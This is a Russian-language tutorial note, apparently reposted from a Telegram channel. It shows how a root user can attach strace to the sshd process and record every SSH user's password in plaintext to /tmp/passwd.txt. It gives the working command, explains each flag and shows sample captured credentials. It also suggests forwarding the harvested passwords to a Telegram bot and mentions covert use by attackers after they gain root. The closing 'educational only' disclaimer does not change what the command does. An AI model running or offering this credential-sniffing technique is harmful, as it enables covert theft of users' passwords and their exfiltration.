---
создал заметку: 2024-05-19T21:28:00
author: WhiteK0T
tags:
  - Bash
  - Linux
  - Security
  - Debug
Источник:
  - https://t.me/bashdays/229
---

**Как узнать пароль пользователя, который подключается к серверу по ssh.** Менять пароль я не буду, это не тру вэй. Я воспользуюсь своим любимым strace.

**Вообще самый простой вариант:** Пишешь пользователю - скажи мне свой пароль, мне нужно кое-что проверить. Если он не дает, просто меняешь его, проверяешь то что тебе нужно и выдаешь ему новый.

Но это актуально для корпоративных систем, когда ты root на сервере, а не кладовщица в обувном магазине.

**Короче идем рутом на сервер и расчехляем strace**
```bash
strace -f -p $(pgrep -o sshd) -o /tmp/passwd.txt -v -e trace=write -s 64
```

Запускаем и собираем урожай в файл passwd.txt. Работает так:

1. -f = следим за всеми процессами sshd (мастер и дочерние)
2. -p = ищем все PID sshd процессов
3. -o = файл куда пишем результаты
4. -v = пишем подробности
5. -e = триггеримся только на запись данных
6. -s = ограничиваем вывод данных 64 байтами (меньше мусора)

Теперь, когда какой-нибудь пользователь авторизуется на сервере по ssh, в файл passwd.txt в открытом виде будет записан его актуальный пароль.

Выглядит это так:
```
1088 write(5,"\0\0\0\5oleg", 9) = 9
1088 write(5, "\0\0\0\Barmaley1982", 17) = 17
```

Логин oleg, пароль Barmaley1982. Дело в шляпе. Этакий сниффер на коленке с помощью коробочных инструментов. Можешь к телеграм боту это прикрутить и получать эти перехваченные данные прям в мессенджере. Как это сделать [писал тут](../Telegram/Шаринг файлов-папок с серверов прямо к себе в Телеграм.md). [[Шаринг файлов-папок с серверов прямо к себе в Телеграм]]

Кстати этим кейсом очень часто пользуются блэкхеты и пентестеры, которые через дыру получают рута и затем втихую проворачивают свои делишки оставаясь в тени.

Такие дела. Ну и как там пишут:

Прошу отметить, что предоставленная здесь информация предназначена исключительно для образовательных и информационных целей. Я не призываю и не одобряю незаконные действия, и использование этой информации для незаконных целей запрещено. Читатели должны соблюдать законы своей страны и использовать свои навыки с уважением к этическим нормам и законам.

Давай, увидимся!

Источник [Bash Days | Linux | DevOps](https://t.me/bashdays/229)
Автор: *Роман Шубин*

#Linux
#Bash
#Debug
#Security